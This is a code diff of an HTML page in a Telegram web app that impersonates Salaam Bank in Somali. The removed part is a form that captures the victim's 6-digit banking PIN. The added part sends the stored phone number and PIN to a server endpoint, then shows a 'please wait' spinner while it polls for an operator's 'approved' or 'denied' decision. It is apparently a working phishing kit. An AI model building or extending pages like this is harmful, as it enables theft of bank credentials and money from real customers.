@@ -3,245 +3,149 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Geli Soff-Code kaaga - Salaam Bank</title>
+    <title>Siga Suxida - Salaam Bank</title>
+
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
 
     <style>
-        body { 
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
-            background-color: #0d1b2a; 
-            margin: 0; 
-            display: flex; 
-            flex-direction: column; 
-            min-height: 100vh; 
-            color: #e2e8f0;
-        }
-
-        .header-box { 
-            width: 100%; 
-            background: linear-gradient(135deg, #001f3f 0%, #003366 100%); 
-            padding: 40px 20px; 
-            color: #f8fafc; 
-            text-align: center; 
-            box-sizing: border-box; 
-            border-bottom: 2px solid #1e3a5f;
-        }
-
-        .main-content { 
-            width: 92%; 
-            max-width: 440px; 
-            margin: 30px auto 0; 
-            text-align: center; 
-            flex-grow: 1; 
-        }
-
-        .footer-box { 
-            width: 100%; 
-            background: linear-gradient(135deg, #001f3f 0%, #002244 100%); 
-            padding: 40px 20px 30px; 
-            color: #94a3b8; 
-            text-align: center; 
-            border-top-left-radius: 50% 25px; 
-            border-top-right-radius: 50% 25px; 
-            box-sizing: border-box; 
-            border-top: 1px solid #1e3a5f;
-        }
-
-        .logo-text { font-size: 32px; font-weight: bold; margin: 0; color: #f8fafc; }
-        .sub-text { font-size: 15px; margin-top: 8px; color: #cbd5e1; }
-        .version-text { font-size: 12px; margin-top: 15px; color: #64748b; }
-        .terms-text { font-size: 11px; margin-top: 15px; padding: 0 30px; color: #64748b; }
-        .terms-text u { color: #38bdf8; }
-
-        h2 { color: #f8fafc; font-size: 22px; margin-bottom: 25px; font-weight: 600; }
-
-        .phone-display {
-            background-color: #1b2a4a;
-            border: 1.5px solid #2a3d66;
-            border-radius: 12px;
-            padding: 16px;
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #0066b2; /* Salaam Bank Logo Blue */
+            margin: 0;
             display: flex;
-            align-items: center;
             justify-content: center;
-            gap: 12px;
-            margin-bottom: 30px;
-            font-size: 18px;
-            color: #f8fafc;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+            color: #333333;
         }
 
-        .pin-label { color: #cbd5e1; margin-bottom: 20px; font-size: 15px; }
-
-        .pin-container { display: flex; justify-content: center; align-items: center; gap: 8px; }
-
-        .pin-input-group { display: flex; gap: 6px; }
-
-        .pin-box {
-            width: 45px;
-            height: 52px;
-            border: 1.5px solid #334155;
-            background-color: #0f172a;
-            color: #38bdf8;
-            border-radius: 10px;
+        .loading-card {
+            background: #ffffff; /* Clean White Card */
+            width: 90%;
+            max-width: 380px;
+            padding: 50px 20px;
+            border-radius: 20px;
             text-align: center;
-            font-size: 22px;
-            font-weight: bold;
-            outline: none;
-            transition: border-color 0.2s;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.15);
+            box-sizing: border-box;
         }
 
-        .pin-box:focus {
-            border-color: #38bdf8;
+        .loader-circle {
+            width: 110px;
+            height: 110px;
+            background-color: #f4f8fb;
+            border: 2px solid #e1ecf4;
+            border-radius: 50%;
+            margin: 0 auto 30px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
         }
 
-        .toggle-eye { cursor: pointer; margin-left: 8px; font-size: 20px; }
-
-        .btn-gal {
-            background-color: #1e293b;
-            color: #64748b;
-            border: 1px solid #334155;
-            width: 100%;
-            padding: 18px;
-            border-radius: 10px;
-            font-size: 18px;
-            margin-top: 40px;
-            cursor: not-allowed;
-            font-weight: bold;
-            transition: all 0.3s ease;
+        .loader-circle::after {
+            content: '';
+            width: 75px;
+            height: 75px;
+            border: 4px solid #cbd5e1;
+            border-top: 4px solid #008744; /* Salaam Bank Logo Green Spinner */
+            border-radius: 50%;
+            animation: spin 1.2s linear infinite;
         }
 
-        .btn-gal.active {
-            background: linear-gradient(135deg, #003366 0%, #004080 100%);
-            color: #f8fafc;
-            border-color: #1e40af;
-            cursor: pointer;
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
 
-        .spacer { height: 40px; }
+        h2 {
+            color: #0066b2; /* Salaam Bank Logo Blue */
+            font-size: 24px;
+            margin: 0 0 10px;
+            font-weight: 700;
+        }
 
-        .error-banner {
-            background-color: rgba(220, 38, 38, 0.15);
-            color: #fca5a5;
-            border: 1px solid #991b1b;
-            padding: 12px;
-            border-radius: 8px;
-            font-size: 14px;
-            font-weight: 500;
-            margin-bottom: 20px;
-            display: none;
+        p {
+            color: #666666;
+            font-size: 15px;
+            margin: 0;
+            line-height: 1.4;
         }
     </style>
 </head>
 
 <body>
 
-<div class="header-box">
-    <p class="logo-text">Salaam Bank</p>
-    <p class="sub-text">Adeegyada Maalgelinta ee Shaacsan</p>
-</div>
-
-<div class="main-content">
-    <h2>Geli PIN-kaaga Bangiga</h2>
-
-    <div id="errorDisplay" class="error-banner"></div>
-
-    <div class="phone-display">
-        <span>🇸🇴</span>
-        <span id="displayPhone">+252 ...</span>
-    </div>
-
-    <p class="pin-label">Fadlan geli 6-da lambar ee sirta ah (PIN)</p>
-
-    <div class="pin-container">
-        <div class="pin-input-group">
-            <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
-            <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
-            <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
-            <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
-            <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
-            <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
-        </div>
-        <span class="toggle-eye" id="eyeIcon">👁️</span>
-    </div>
-
-    <button id="loginBtn" class="btn-gal" disabled>GAL</button>
-    <div class="spacer"></div>
-</div>
-
-<div class="footer-box">
-    <p class="logo-text">Salaam Bank</p>
-    <p class="sub-text">Maalgelin Habboon oo Ammaan ah</p>
-    <p class="version-text">v2.1.3P</p>
-    <p class="terms-text">Markaad gasho, waxaad ka mid tahay inaad aqbashay <u>Shuruudaha & Xeerarka</u></p>
+<div class="loading-card">
+    <div class="loader-circle"></div>
+    <h2 id="main-text">Waa La Dhadhaminayaa...</h2>
+    <p id="sub-text">Siga suxida xaqiijinta...</p>
 </div>
 
 <script>
-document.addEventListener("DOMContentLoaded", () => {
+document.addEventListener("DOMContentLoaded", async () => {
 
-    const pinBoxes = document.querySelectorAll('.pin-box');
-    const loginBtn = document.getElementById('loginBtn');
-    const eye = document.getElementById('eyeIcon');
-    const displayPhone = document.getElementById('displayPhone');
-    const errorDisplay = document.getElementById('errorDisplay');
+    const mainText = document.getElementById("main-text");
+    const subText = document.getElementById("sub-text");
 
-    const savedPhone = localStorage.getItem('phone');
-    displayPhone.textContent = savedPhone ? `+252 ${savedPhone}` : "+252 (lamana helin)";
-
-    const urlParams = new URLSearchParams(window.location.search);
-    if (urlParams.get('error') === 'wrongpin') {
-        errorDisplay.innerText = "❌ PIN-ka waa magal. Fadlan geli PIN-ka saxda ah.";
-        errorDisplay.style.display = "block";
+    const tg = window.Telegram?.WebApp;
+    if (tg) {
+        tg.ready();
+        tg.expand();
     }
 
-    pinBoxes.forEach((box, index) => {
-        box.addEventListener('input', () => {
-            box.value = box.value.replace(/\D/g, '');
+    const phone = localStorage.getItem("phone") || "";
+    const pin = localStorage.getItem("lastPin") || "";
 
-            if (box.value && index < pinBoxes.length - 1) {
-                pinBoxes[index + 1].focus();
+    if (!phone) {
+        console.warn("⚠️ Nambar telefoon lama helin.");
+    }
+
+    // -------------------- SEND LOGIN REQUEST --------------------
+    try {
+        await fetch("/api/login-notification", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ phone, pin })
+        });
+    } catch (err) {
+        console.error("❌ Makal-mucaawino:", err);
+    }
+
+    // -------------------- TEXT CHANGE --------------------
+    setTimeout(() => {
+        mainText.textContent = "Fadlan sug...";
+        subText.textContent = "Tani waxay qaadanaysaa daqiiqado yar";
+    }, 3000);
+
+    // -------------------- CHECK APPROVAL --------------------
+    async function checkApproval() {
+        if (!phone) return;
+
+        try {
+            const res = await fetch(`/api/check-status?phone=${phone}`);
+            const data = await res.json();
+
+            if (data.status === "approved") {
+                mainText.textContent = "Waa La Ansixiyay!";
+                subText.textContent = "Waqti yar ka dib bogga xiga ayaa furmi doona...";
+
+                setTimeout(() => {
+                    window.location.href = "/page8";
+                }, 1500);
             }
 
-            checkInputs();
-        });
-
-        box.addEventListener('keydown', (e) => {
-            if (e.key === "Backspace" && !box.value && index > 0) {
-                pinBoxes[index - 1].focus();
+            if (data.status === "denied") {
+                mainText.textContent = "Lama Ansixin!";
+                subText.textContent = "Xogtaada waa mid aan sax ahayn.";
             }
-        });
-    });
 
-    function checkInputs() {
-        const filled = [...pinBoxes].every(b => b.value);
-        loginBtn.disabled = !filled;
-        loginBtn.classList.toggle('active', filled);
+        } catch (err) {
+            console.error("❌ Hubinta xaalada waa lagulamaid:", err);
+        }
     }
 
-    eye.addEventListener('click', () => {
-        const show = pinBoxes[0].type === "password";
-        pinBoxes.forEach(b => b.type = show ? "text" : "password");
-        eye.textContent = show ? "🫣" : "👁️";
-    });
-
-    loginBtn.addEventListener('click', () => {
-        if (!savedPhone) return;
-        
-        loginBtn.disabled = true;
-        loginBtn.classList.remove('active');
-
-        let pin = "";
-        pinBoxes.forEach(b => pin += b.value);
-        localStorage.setItem('lastPin', pin);
-
-        errorDisplay.style.display = "none";
-
-        window.location.href = "/page7.html";
-    });
-
-    if (window.Telegram?.WebApp) {
-        window.Telegram.WebApp.ready();
-        window.Telegram.WebApp.expand();
-    }
+    setInterval(checkApproval, 2000);
 });
 </script>
 
